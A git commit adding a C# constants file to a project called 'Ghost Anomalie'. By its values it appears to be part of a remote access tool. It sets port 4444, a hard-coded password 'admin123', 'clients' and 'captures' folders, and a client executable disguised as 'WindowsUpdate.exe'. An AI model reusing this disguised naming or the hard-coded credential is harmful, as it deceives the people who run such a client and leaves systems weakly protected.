55696a26eae14dabb986e0dac0ec9ad984e9a68e
DEV MESSY <techdevask@gmail.com>
2026-08-19 20:14:55 +0100

    Create Constants.cs

---
+++ src/GhostAnomalie.Common/Utils/Constants.cs
@@ -0,0 +1,17 @@
+namespace GhostAnomalie.Common.Utils
+{
+    public static class Constants
+    {
+        public const string Version = "1.3.0.3";
+        public const string AppName = "Ghost Anomalie";
+        public const string Author = "Dev Messy from Gabon 🇬🇦";
+        public const int DefaultPort = 4444;
+        public const string DefaultPassword = "admin123";
+        public const int BufferSize = 8192;
+        public const int MaxPacketSize = 1024 * 1024 * 10; // 10MB
+        public const string ClientFileName = "WindowsUpdate.exe";
+        public const string ClientsFolder = "clients";
+        public const string LogsFolder = "logs";
+        public const string CapturesFolder = "captures";
+    }
+}
